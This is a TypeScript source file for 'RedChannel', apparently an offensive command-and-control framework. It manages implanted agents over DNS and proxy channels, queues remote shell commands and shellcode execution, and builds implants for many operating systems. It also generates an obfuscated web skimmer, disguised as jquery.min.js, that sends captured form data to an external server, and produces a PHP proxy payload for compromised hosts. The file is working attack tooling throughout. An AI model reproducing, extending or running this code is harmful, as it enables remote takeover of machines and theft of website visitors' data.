import * as fs from "fs";
import * as jsObfuscator from "javascript-obfuscator";
import axios from "axios";
import * as crypto from "crypto";
import * as os from "os";
import * as path from "path";
import { spawn, ChildProcessWithoutNullStreams } from "child_process";
import { emsg } from "../utils/utils";
import RedChannelCrypto, { CipherModel } from "./crypto";
import ECKey from "ec-key";
import RedChannelLogger from "./logger";

const RC_VERSION = "0.3.0";

const DATA_PAD_CHAR = "f";
const RECORD_DATA_PREFIX = "2001";
const RECORD_HEADER_PREFIX = "ff00";
const MAX_DATA_BLOCKS_PER_IP = 6;
const MAX_RECORDS_PER_COMMAND = 15; // first record is ip header, rest is data

const VALID_CLASS_ID_REGEX = /^-?[\s_a-zA-Z,]+[\s_a-zA-Z0-9-,]*$/;
const VALID_URL_REGEX = /^http:\/\/\w+(\.\w+)*(:[0-9]+)?\/?(\/[.\w]*)*$/;
const VALID_ROUTE_REGEX = /^\/[a-zA-Z0-9_\-\.]*$/;
const VALID_PROXY_DATA = /^[\:\;a-f0-9\.]+$/;
const VALID_IP_REGEX = /^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$/;
const VALID_HOST_REGEX = /^(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)*([A-Za-z0-9]|[A-Za-z0-9][A-Za-z0-9\-]*[A-Za-z0-9])$/;
const VALID_BUILD_TARGET_OS = /^(windows|linux|darwin|android|netbsd|openbsd|freebsd|dragonfly|solaris)$/i;
const VALID_BUILD_TARGET_ARCH = /^(amd64|arm|arm64|386|ppc64|ppc64le|mipsle|mips|mips64|mips64le)$/i;
const VALID_IMPLANT_RESOLVER =
    /^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]):([0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$/i;

const DEFAULT_CONF_PATH = "conf/redchannel.conf";

export enum AgentCommands {
    AGENT_SYSINFO = 0x01,
    AGENT_CHECKIN = 0x02,
    AGENT_SHELL = 0x03,
    AGENT_MSG = 0x04,
    AGENT_EXEC_SC = 0x05,
    AGENT_SHUTDOWN = 0x06,
    AGENT_KEYX = 0x07,
    AGENT_SET_CONFIG = 0x08,
    AGENT_IGNORE = 0xff,
}

export interface AgentModel {
    ident: string;
    secret?: Buffer;
    keyx?: ECKey;
    lastseen?: number;
    ip?: string;
    channel?: AgentChannel;
    allow_keyx?: boolean;
    sendq?: Array<string[]>;
    recvq?: any;
    ignore?: any;
}

export enum AgentChannel {
    DNS = "dns",
    PROXY = "proxy",
}

class RedChannel {
    version = RC_VERSION;

    c2_message_handler: Function;

    agents: { [agentId: string]: AgentModel };

    /**
     * available commands for 'help' to display
     *
     * agent commands are available while interacting with an agent
     * c2 commands are available in the main menu
     */
    commands: any;

    /**
     * holds the agent object we are currently interacting with
     */
    interact: AgentModel | null;

    /**
     * module actions
     *
     * function will be executed when the command is typed
     */
    modules: any;

    master_password: string;

    // name of module currently interacting with
    using_module: string;

    config_file: string;

    config: any;

    // the absolute path to the app directory
    app_root: string = path.resolve("./");

    log: RedChannelLogger;

    crypto: RedChannelCrypto;

    constructor(c2_message_handler: Function) {
        this.log = new RedChannelLogger();

        // c2 message handler is called with mock DNS data when fetching from proxy
        // TODO: this is ugly, change it
        this.c2_message_handler = c2_message_handler;

        this.agents = {};
        this.commands = {
            agent: {
                sysinfo: {
                    params: [],
                    desc: "get system info",
                },
                keyx: {
                    params: [],
                    desc: "start a key exchange with the agent",
                },
                agents: {
                    params: [],
                    desc: "show active agents",
                },
                interact: {
                    params: ["<agent id>"],
                    desc: "interact with an agent",
                },
                shell: {
                    params: ["<command>"],
                    desc: "execute a shell command, alias: exec_cmd",
                },
                msg: {
                    params: ["<message>"],
                    desc: "send an encrypted message to the agent, requires keyx",
                },
                shutdown: {
                    params: ["<agent id>"],
                    desc: "shutdown the agent, confirm by entering the id, agent will not reconnect",
                },
                debug: {
                    params: [],
                    desc: "show verbose messages",
                },
                help: {
                    params: [],
                    desc: "show available commands",
                },
                "set proxy_url": {
                    params: ["<url>"],
                    desc: "set the proxy url to use (http://proxy.domain.tld/proxy.php)",
                    validate_regex: VALID_URL_REGEX,
                },
                "set proxy_enabled": {
                    params: ["<1|0>"],
                    desc: "enable or disable proxy communication",
                },
                "set proxy_key": {
                    params: ["<key>"],
                    desc: "key to use for proxy communication",
                },
                "set interval": {
                    params: ["<ms>"],
                    desc: "how often to checkin with the c2 (dns or proxy)",
                    validate_regex: /^[0-9]+$/,
                },
                // "set domain": {
                //     params: ["<c2.domain.tld>"],
                //     desc: "set the c2 domain"
                // },
                // "set password": {
                //     params: ["<password>"],
                //     desc: "set the c2 password"
                // },
            },
            c2: {
                keyx: {
                    params: [],
                    desc: "start key exchange with all agents",
                },
                agents: {
                    params: [],
                    desc: "show active agents",
                },
                interact: {
                    params: ["<agent id>"],
                    desc: "interact with an agent",
                },
                kill: {
                    params: ["<agent id>"],
                    desc: "deletes the agent from memory, agent may reconnect",
                },
                debug: {
                    params: [],
                    desc: "show verbose messages",
                },
                "use skimmer": {
                    params: [],
                    desc: "use the skimmer module",
                },
                "use proxy": {
                    params: [],
                    desc: "use the proxy module",
                },
                "use static_dns": {
                    params: [],
                    desc: "use the static_dns module to add or remove static dns records",
                },
                "use implant": {
                    params: [],
                    desc: "use the implant module to build agents",
                },
                help: {
                    params: [],
                    desc: "show available commands",
                },
            },
            module_common: {
                reset: {
                    params: [],
                    desc: "reset config to .conf values",
                },
                config: {
                    params: [],
                    desc: "view config",
                },
                help: {
                    params: [],
                    desc: "show available commands",
                },
                back: {
                    params: [],
                    desc: "back to main menu",
                },
            },
            skimmer: {
                generate: {
                    params: [],
                    desc: "generate skimmer payload with the specified url and target classes and ids",
                },
                "set url": {
                    params: ["<url>"],
                    desc: "set the external skimmer c2 url (http://skimmer.url)",
                    validate_regex: VALID_URL_REGEX,
                },
                "set data_route": {
                    params: ["<route>"],
                    desc: "set the skimmer url data route (/stats)",
                    validate_regex: VALID_ROUTE_REGEX,
                },
                "set target_classes": {
                    params: ["<class 1,class 2,class 3>"],
                    desc: "(optional) target classes with skimmer click handler, separated by comma",
                    validate_regex: VALID_CLASS_ID_REGEX,
                },
                "set target_ids": {
                    params: ["<id 1,id 2,id 3>"],
                    desc: "(optional) target ids with skimmer click handler, separated by comma",
                    validate_regex: VALID_CLASS_ID_REGEX,
                },
            },
            proxy: {
                fetch: {
                    params: [],
                    desc: "force a fetch from the proxy",
                },
                generate: {
                    params: [],
                    desc: "generate proxy payload with the specified key",
                },
                "set url": {
                    params: ["<url>"],
                    desc: "set the proxy url to use (http://proxy.domain.tld/proxy.php)",
                    validate_regex: VALID_URL_REGEX,
                },
                "set enabled": {
                    params: ["<1|0>"],
                    desc: "enable or disable proxy communication channel",
                },
                "set key": {
                    params: ["<key>"],
                    desc: "key to use for proxy communication",
                },
                "set interval": {
                    params: ["<ms>"],
                    desc: "how often to fetch data from proxy, in ms",
                },
            },
            static_dns: {
                add: {
                    params: ["<host>", "<ip>"],
                    desc: "add a static DNS A record",
                },
                delete: {
                    params: ["<host>"],
                    desc: "delete static DNS A record",
                },
            },
            implant: {
                build: {
                    params: ["[os]", "[arch]"],
                    desc: "build the agent for the target os and arch",
                },
                generate: {
                    params: ["[os]", "[arch]"],
                    desc: "alias for 'build'",
                },
                log: {
                    params: [],
                    desc: "show the build log",
                },
                "set os": {
                    params: ["<windows|linux|darwin|...>"],
                    desc: "set the target os for the build (GOOS)",
                    validate_regex: VALID_BUILD_TARGET_OS,
                },
                "set arch": {
                    params: ["<amd64|386|arm64|mips|...>"],
                    desc: "set the target arch for the build (GOARCH)",
                    validate_regex: VALID_BUILD_TARGET_ARCH,
                },
                "set interval": {
                    params: ["<ms>"],
                    desc: "set implant c2 query interval",
                },
                "set resolver": {
                    params: ["<ip:port>"],
                    desc: "set implant resolver ip:port (8.8.8.8:53)",
                    validate_regex: VALID_IMPLANT_RESOLVER,
                },
                "set debug": {
                    params: ["<1|0>"],
                    desc: "build debug version of the implant",
                },
            },
        };

        this.master_password = "";

        this.modules = {
            proxy: {
                fetch_timer: {}, // stores the loop Timeout ref
                actions: {
                    generate: this.proxy_generate,
                    fetch: this.proxy_fetch,
                    "set enabled": this.proxy_enable,
                },
            },
            skimmer: {
                payload: "", // generated, payload to serve via payload_route,
                actions: {
                    generate: this.skimmer_generate,
                },
            },
            static_dns: {
                actions: {
                    add: this.static_dns_add,
                    delete: this.static_dns_delete,
                },
            },
            implant: {
                actions: {
                    generate: this.implant_build,
                    build: this.implant_build,
                    log: this.implant_log,
                },
            },
        };

        this.using_module = "";

        this.config_file = DEFAULT_CONF_PATH;

        // merged with data from config file
        this.config = {
            c2: {
                domain: "",
                dns_ip: "127.0.0.1",
                dns_port: 53,
                web_ip: "127.0.0.1",
                web_port: 4321,
                agent_interval: 5000,
            },
            skimmer: {
                payload_route: "/jquery.min.js",
                data_route: "/stats",
                url: "",
                target_classes: [],
                target_ids: [],
            },
            proxy: {
                enabled: false,
                url: "",
                key: "",
                interval: 2000,
            },
            implant: {
                os: "windows",
                arch: "amd64",
            },
            static_dns: {},
            debug: false,
        };

        this.app_root = __dirname;

        this.crypto = new RedChannelCrypto();

        this.interact = null;
    }

    init_agent(agent_id, channel: AgentChannel) {
        if (typeof this.agents[agent_id] == "undefined") {
            this.agents[agent_id] = {
                ident: agent_id,
                lastseen: 0,
                channel: channel,
                allow_keyx: false,
            };
        }
    }

    kill_agent(agent_id) {
        delete this.agents[agent_id];
    }

    command_keyx(agent_id?: string) {
        if (!this.crypto.privateKey) {
            this.crypto.generate_keys();
        }

        const uncompressedPublicKey = this.crypto.export_pubkey("uncompressed");
        if (!agent_id) {
            // broadcast keyx if no agent is specified
            Object.keys(this.agents).forEach((id) => {
                this.queue_data(id, AgentCommands.AGENT_KEYX, uncompressedPublicKey);
            });
            return;
        }

        if (typeof this.agents[agent_id] != "undefined") {
            this.queue_data(agent_id, AgentCommands.AGENT_KEYX, uncompressedPublicKey);
        }
        return;
    }

    command_shutdown() {
        if (!this.interact) return;
        this.queue_data(this.interact.ident, AgentCommands.AGENT_SHUTDOWN, this.aesEncryptedPayload(crypto.randomBytes(6).toString("hex")));
    }

    command_shell(shell_cmd) {
        if (!this.interact) return;
        this.queue_data(this.interact.ident, AgentCommands.AGENT_SHELL, shell_cmd);
    }

    command_exec_sc(shellcode) {
        if (!this.interact) return;
        this.queue_data(this.interact.ident, AgentCommands.AGENT_EXEC_SC, shellcode);
    }

    // agent must be able to decrypt the tag to execute shutdown
    command_sysinfo() {
        if (!this.interact) return;
        this.queue_data(this.interact.ident, AgentCommands.AGENT_SYSINFO, this.aesEncryptedPayload(crypto.randomBytes(6).toString("hex")));
    }
    /**
     * config format:
     *
     * agent_interval=5000
     * c2_domain=domain1[,domain2?]
     */
    command_set_config(config: string) {
        if (!this.interact) return;
        this.queue_data(this.interact.ident, AgentCommands.AGENT_SET_CONFIG, config);
    }

    aesEncryptedPayload(data: string): string {
        if (!this.interact) return "";

        const buffer = Buffer.from(data);
        const cipher = this.crypto.aes_encrypt(buffer, this.interact.secret);
        const payload = this.make_encrypted_buffer_string(cipher);
        return payload;
    }
    /**
     * queue up data to send when agent checks in next
     * 2001:[record_num]:[4 byte data]:...
     *
     * first IP in each command must be the data identifier for agent to track
     * ff00:[data_id]:[command][padded_bytes_count]:[total_records]:[4 byte reserved data]:...
     *
     */
    queue_data(agentId, command, data) {
        const agent = this.agents[agentId];

        let dataPayload = this.aesEncryptedPayload(data);
        if (dataPayload.length == 0) dataPayload = crypto.randomBytes(2).toString("hex");

        let dataBlocks = dataPayload.match(/[a-f0-9]{1,4}/g);
        if (!dataBlocks) return;

        // prettier-ignore
        const totalRecords =
            Math.floor(dataBlocks.length / MAX_DATA_BLOCKS_PER_IP) +
            (dataBlocks.length % MAX_DATA_BLOCKS_PER_IP == 0 ? 0 : 1);

        // prettier-ignore
        const totalCommands =
            Math.floor(totalRecords / MAX_RECORDS_PER_COMMAND) +
            (totalRecords % MAX_RECORDS_PER_COMMAND == 0 ? 0 : 1);

        const dataId = crypto.randomBytes(2).toString("hex");

        let records: string[] = [];
        // let addedCommands = 1;
        let paddedBytes = 0;
        let record = "";
        for (let recordNum = 0; recordNum < totalRecords; recordNum++) {
            const blocksPerIp = dataBlocks.splice(0, MAX_DATA_BLOCKS_PER_IP);

            // pad the last block with trailing Fs
            const lastAddedBlock = blocksPerIp.slice(-1)[0];
            paddedBytes = 4 - lastAddedBlock.length;
            blocksPerIp[blocksPerIp.length - 1] = this.pad_tail(lastAddedBlock, 4);
            if (blocksPerIp.length < MAX_DATA_BLOCKS_PER_IP) {
                const blocksNeeded = MAX_DATA_BLOCKS_PER_IP - blocksPerIp.length;
                for (let j = 0; j < blocksNeeded; j++) {
                    blocksPerIp.push(DATA_PAD_CHAR.repeat(4));
                    paddedBytes += 4;
                }
            }
            if (paddedBytes > 0) {
                paddedBytes = paddedBytes / 2; // agent assumes bytes not hex strings
            }

            // prettier-ignore
            record =
                RECORD_DATA_PREFIX +
                ":" +
                this.pad_zero(recordNum.toString(16), 4) +
                ":" +
                blocksPerIp.join(":");
            records.push(record);

            if (totalCommands > 1 && (records.length == MAX_RECORDS_PER_COMMAND - 1 || recordNum == totalRecords - 1)) {
                // prettier-ignore
                record =
                    RECORD_HEADER_PREFIX +
                    ":" +
                    dataId +
                    ":" +
                    this.pad_zero(command.toString(16), 2) +
                    this.pad_zero(paddedBytes.toString(16), 2) +
                    ":" +
                    this.pad_zero(totalRecords.toString(16), 4) +
                    ":" +
                    "0000:0000:0000:0001";

                records.unshift(record);
                // addedCommands++;

                agent.sendq?.push(records);
                records = [];
            }
        }
        if (totalCommands == 1) {
            // prettier-ignore
            record =
                RECORD_HEADER_PREFIX +
                ":" +
                dataId +
                ":" +
                this.pad_zero(command.toString(16), 2) +
                this.pad_zero(paddedBytes.toString(16), 2) +
                ":" +
                this.pad_zero(totalRecords.toString(16), 4) +
                ":" +
                "0000:0000:0000:0001";
            records.unshift(record);
        }

        // set to false after keyx is received and there are no more keyx in sendq
        if (command == AgentCommands.AGENT_KEYX) agent.allow_keyx = true;

        if (records.length > 0) {
            agent.sendq?.push(records);
            if (this.config.proxy.enabled && agent.channel == "proxy") {
                this.send_to_proxy(agentId, records);

                // cleanup sendq if proxying to agent
                agent.sendq = [];
            }
        }
        //console.log("* queued up " + total_records + " records in " + total_commands + " command(s) for agent: " + agent_id);
        //console.log("`- records: " + JSON.stringify(records));
    }

    async send_to_proxy(agentId: string, records: string[]) {
        const recordsString = `${records.join(";")};`;

        // console.log("* sending data to proxy: " + str_data);
        const data = {
            d: recordsString,
            k: this.config.proxy.key,
            i: agentId,
            p: "c",
        };

        try {
            const res = await axios.post(this.config.proxy.url, data);
            this.log.debug(`proxy send response: ${res.data}`);
        } catch (ex) {
            this.log.error(`failed to send data to proxy: ${emsg(ex)}`);
        }
        return;
    }

    async get_from_proxy() {
        if (!this.config.proxy.enabled) return;
        if (this.config.proxy?.url || this.config.proxy?.key) return;

        const data = {
            url: this.config.proxy.url,
            form: {
                k: this.config.proxy.key,
                f: "a",
            },
        };

        return axios
            .post(this.config.proxy.url, data)
            .then((result) => this.process_proxy_data(result.data))
            .catch((e) => {
                throw new Error(`proxy fetch failed: ${e.message}`);
            });
    }

    process_proxy_data(proxyData: string) {
        // we expect the proxy to respond with ERR 1, or similar
        // this.ui.debug(`proxy response:\n${proxyData}`);
        if (proxyData.length <= 5) throw new Error(`unexpected response (too small)`);
        if (!VALID_PROXY_DATA.test(proxyData)) throw new Error(`invalid incoming proxy data`);

        // grab proxy response and build mock dns queries
        let data = proxyData.replace(/;$/, "").split(";");
        data.forEach((q) => {
            let req = {
                connection: {
                    remoteAddress: this.config.proxy.url,
                    type: "PROXY",
                },
            };
            let res = {
                question: [
                    {
                        type: "PROXY",
                        name: `${q}.${this.config.c2.domain}`,
                    },
                ],
                answer: [],
                end: () => {},
            };
            this.c2_message_handler(req, res);
        });
    }

    pad_zero(proxyData, max_len) {
        return "0".repeat(max_len - proxyData.length) + proxyData;
    }
    pad_tail(proxyData, max_len) {
        return proxyData + DATA_PAD_CHAR.repeat(max_len - proxyData.length);
    }

    is_command_in_sendq(agent_id, command) {
        var is = false;
        var cmd = this.pad_zero(command.toString(16), 2);

        this.agents[agent_id].sendq?.forEach((q) => {
            if (q[0].substring(0, 4) == RECORD_HEADER_PREFIX) {
                if (q[0].substring(12, 14) == cmd) {
                    is = true;
                    return;
                }
            }
        });
        return is;
    }

    make_ip_string(last_byte) {
        return `${RECORD_HEADER_PREFIX}:0000:${AgentCommands.AGENT_IGNORE.toString(16)}01:0000:0000:dead:c0de:00${last_byte}`;
    }

    /**
     * Make a string the cipher data and iv
     * @param {CipherModel} cipher A cipher object with IV and Data
     * @returns a hex string
     */
    make_encrypted_buffer_string(cipher: CipherModel) {
        return Buffer.concat([cipher.iv, cipher.data]).toString("hex");
    }

    count_data_chunks(chunks_array: string[]) {
        return chunks_array.filter((a) => a !== undefined).length;
    }

    /**
     * return an array of agent idents with an optional
     * prepended text to each ident (for tab completion)
     */
    get_all_agents(prepend = "") {
        const agents: string[] = [];
        Object.keys(this.agents).forEach((a) => {
            agents.push(prepend + this.agents[a].ident);
        });
        return agents;
    }

    get_agent(agent_id): AgentModel {
        let agent: AgentModel = { ident: "" };
        Object.keys(this.agents).forEach((a) => {
            if (a == agent_id) {
                agent = this.agents[a];
                return;
            }
        });
        return agent;
    }

    /**
     * skimmer generate action
     */
    skimmer_generate() {
        if (this.config.skimmer.url.length == 0) throw new Error(`skimmer url is required, see 'help'`);

        let data: Buffer;
        let skimmerJs = "";
        try {
            data = fs.readFileSync("payloads/skimmer.js");
            skimmerJs = data.toString();
        } catch (ex) {
            throw new Error(`failed to generate payload: ${emsg(ex)}`);
        }

        const targetClasses = "['" + this.config.skimmer.target_classes.join("','") + "']";
        const targetIds = "['" + this.config.skimmer.target_ids.join("','") + "']";
        const targetUrl = this.config.skimmer.url;
        const targetDataRoute = this.config.skimmer.data_route;

        skimmerJs = skimmerJs.replace(/\[SKIMMER_URL\]/, targetUrl);
        skimmerJs = skimmerJs.replace(/\[SKIMMER_DATA_ROUTE\]/, targetDataRoute);
        skimmerJs = skimmerJs.replace(/\[SKIMMER_CLASSES\]/, targetClasses);
        skimmerJs = skimmerJs.replace(/\[SKIMMER_IDS\]/, targetIds);
        skimmerJs = skimmerJs.replace(/\s+console\.log\(.+;/g, "");

        let obfs: jsObfuscator.ObfuscationResult;
        try {
            obfs = jsObfuscator.obfuscate(skimmerJs, {
                compact: true,
                controlFlowFlattening: true,
                transformObjectKeys: true,
                log: false,
                renameGlobals: true,
                stringArray: true,
                stringArrayEncoding: ["rc4"],
                identifierNamesGenerator: "mangled",
            });
            this.modules.skimmer.payload = obfs.getObfuscatedCode();
        } catch (ex) {
            throw new Error(`failed to obfuscate js payload: ${emsg(ex)}`);
        }

        return { message: `skimmer payload set to: \n${this.modules.skimmer.payload}` };
    }

    /**
     * proxy generate action
     */
    proxy_generate() {
        if (!this.config.proxy.key) throw new Error(`proxy key is required, see 'help'`);

        let data: Buffer;
        let proxyPhp = "";
        try {
            data = fs.readFileSync("payloads/proxy.php");
            proxyPhp = data.toString();
        } catch (ex) {
            throw new Error(`failed to generate payload: ${emsg(ex)}`);
        }

        proxyPhp = proxyPhp.replace(/\[PROXY_KEY\]/, this.config.proxy.key);
        proxyPhp = proxyPhp.replace(/\/\/.+/g, "");
        proxyPhp = proxyPhp.replace(/<\?php/g, "");
        proxyPhp = proxyPhp.replace(/\?>/g, "");
        proxyPhp = proxyPhp.replace(/\n/g, "");
        proxyPhp = proxyPhp.replace(/\s{2,}/g, "");

        this.modules.proxy.payload = `<?php ${proxyPhp} ?>`;
        return { message: `proxy payload set: \n${this.modules.proxy.payload}` };
    }
    proxy_fetch() {
        this.get_from_proxy();
        return { message: "fetching data from proxy..." };
    }

    proxy_enable() {
        let message = this.config.proxy.enabled ? `starting proxy checkin at interval: ${this.config.proxy.interval}ms` : `stopping proxy checkin`;

        this.proxy_fetch_loop();
        return { message: message, error: false };
    }

    /**
     * Proxy loop
     */
    proxy_fetch_loop() {
        if (this.modules.proxy.fetch_timer) clearTimeout(this.modules.proxy.fetch_timer);
        if (!this.config.proxy.enabled) return;

        this.get_from_proxy().finally(() => {
            this.modules.proxy.fetch_timer = setTimeout(() => {
                this.proxy_fetch_loop();
            }, this.config.proxy.interval);
        });
    }

    static_dns_add(params) {
        if (params.length < 2) throw new Error(`please enter a host and ip, see 'help'"`);

        let host = params[0];
        let ip = params[1];

        if (!VALID_HOST_REGEX.test(host)) throw new Error(`invalid host value, see 'help'`);
        if (!VALID_IP_REGEX.test(ip)) throw new Error(`invalid ip value, see 'help'`);

        this.config.static_dns[host] = ip;
        return { message: `added static dns record ${host} = ${ip}` };
    }

    static_dns_delete(params) {
        if (params.length == 0) throw new Error(`please enter a host, see 'help'"`);

        const host = params[0];
        if (!VALID_HOST_REGEX.test(host)) throw new Error(`invalid host value, see 'help'`);

        delete this.config.static_dns[host];
        return { message: `deleted static dns record ${host}` };
    }

    implant_build_gen_config() {
        let data: Buffer;
        let configData = "";
        let agentConfigPath = `${this.app_root}/agent/config/config.go`;
        try {
            data = fs.readFileSync(`${agentConfigPath}.sample`);
            configData = data.toString();
        } catch (ex) {
            throw new Error(`failed to read agent config file template '${agentConfigPath}.sample': ${emsg(ex)}`);
        }

        configData = configData.replace(/^\s*c\.C2Domain\s*=\s*\".*\".*$/im, `c.C2Domain = "${this.config.c2.domain}"`);
        configData = configData.replace(/^\s*c\.C2Password\s*=\s*\".*\".*$/im, `c.C2Password = "${this.config.c2.plaintext_password}"`);
        configData = configData.replace(/^\s*c\.Resolver\s*=\s*\".*\".*$/im, `c.Resolver = "${this.config.implant.resolver}"`);
        configData = configData.replace(/^\s*c\.C2Interval\s*=.*$/im, `c.C2Interval = ${this.config.implant.interval}`);
        configData = configData.replace(/^\s*c\.ProxyEnabled\s*=.*$/im, `c.ProxyEnabled = ${this.config.proxy.enabled}`);
        configData = configData.replace(/^\s*c\.ProxyUrl\s*=\s*\".*\".*$/im, `c.ProxyUrl = "${this.config.proxy.url}"`);
        configData = configData.replace(/^\s*c\.ProxyKey\s*=\s*\".*\".*$/im, `c.ProxyKey = "${this.config.proxy.key}"`);

        try {
            fs.writeFileSync(agentConfigPath, configData, { flag: "w" });
        } catch (ex) {
            throw new Error(`failed to write agent config file '${agentConfigPath}': ${emsg(ex)}`);
        }
        return { message: `agent config file written to: ${agentConfigPath}` };
    }

    implant_build(params) {
        const targetOs = params[0] ?? this.config.implant.os;
        const targetArch = params[1] ?? this.config.implant.arch;
        const debug = this.config.implant.debug;

        if (!VALID_BUILD_TARGET_OS.test(targetOs)) throw new Error(`invalid os value, must be supported by Go (GOOS)`);
        if (!VALID_BUILD_TARGET_ARCH.test(targetArch)) throw new Error(`invalid arch value, must be supported by Go (GOARCH)`);

        try {
            this.implant_build_gen_config();
        } catch (ex) {
            throw new Error(`error generating build config: ${emsg(ex)}`);
        }

        const buildPath = `${this.app_root}/agent`;
        const outputFile = `${buildPath}/build/agent${targetOs === "windows" ? ".exe" : ""}`;

        // prettier-ignore
        const commandArguments = [
            `${buildPath}/tools/build.py`,
            `${buildPath}`,
            `${outputFile}`,
            targetOs,
            targetArch,
            debug && "debug",
        ];
        const goEnvironment = {
            GOOS: targetOs,
            GOARCH: targetArch,
            GO111MODULE: "auto",
            GOCACHE: path.join(os.tmpdir(), "rc-build-cache"), // 'go cache clean' after build?
            GOPATH: path.join(os.tmpdir(), "rc-build-path"),
            PATH: process.env.PATH,
        };

        const spawnBinary = "python";
        let childProcess: ChildProcessWithoutNullStreams;
        try {
            // TODO: do this with docker instead? https://hub.docker.com/_/golang
            childProcess = spawn(spawnBinary, commandArguments, {
                env: goEnvironment,
                cwd: buildPath /*, windowsVerbatimArguments: true*/,
            });
            childProcess.on("close", (code) => {
                // send this message to the UI somehow
                this.log.success(`agent build for os: ${targetOs}, arch: ${targetArch}, debug: ${debug ? "true" : "false"}, return code: ${code}`);
            });
        } catch (ex) {
            return { message: `failed to launch build command: '${emsg(ex)}', build command: '${spawnBinary} ${commandArguments.join(" ")}'`, error: true };
        }

        try {
            const logStream = fs.createWriteStream(`${this.app_root}/agent/build/build.log`, { flags: "w" });
            childProcess.stdout.pipe(logStream);
            childProcess.stderr.pipe(logStream);
        } catch (ex) {
            throw new Error(`failed to write log file: ${emsg(ex)}`);
        }

        this.config.implant.output_file = outputFile;

        const binaryUrl = this.config.c2.web_url + this.config.c2.binary_route;

        return {
            message: `building ${debug ? "(debug)" : ""} agent for os: ${targetOs}, arch: ${targetArch}, binary will be available here: ${outputFile} and ${binaryUrl}`,
        };
    }
    implant_log() {
        var log_path = `${this.app_root}/agent/build/build.log`;
        var log_data = "";
        try {
            log_data = fs.readFileSync(log_path).toString();
        } catch (ex) {
            return { message: `error: failed to read build log file: ${emsg(ex)}`, error: true };
        }

        return { message: log_data, error: false };
    }
}

export default RedChannel;
